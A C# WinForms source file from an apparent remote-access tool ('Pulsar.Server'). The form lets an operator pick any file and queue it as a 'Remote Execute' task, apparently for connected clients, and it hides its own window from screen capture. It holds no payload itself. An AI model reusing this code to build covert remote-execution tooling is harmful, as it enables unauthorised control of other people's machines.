﻿using Pulsar.Server.Forms.DarkMode;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.ServiceModel.Channels;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Pulsar.Server.Forms
{
    public partial class FrmTaskExecute : Form
    {
        public FrmTaskExecute()
        {
            InitializeComponent();
            DarkModeManager.ApplyDarkMode(this);
			ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
        }

        private void FrmTaskExecute_Load(object sender, EventArgs e)
        {

        }
        // Add task
        private void button2_Click(object sender, EventArgs e)
        {
            FrmMain frm = Application.OpenForms["FrmMain"] as FrmMain;
            if (frm != null)
            {
                frm.AddTask("Remote Execute", FPTextBox.Text, "");
            }
        }

        //browse for file
        private void button1_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Title = "Select a File";
                openFileDialog.Filter = "All Files (*.*)|*.*"; 
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    FPTextBox.Text = openFileDialog.FileName;
                }
            }
        }

    }
}
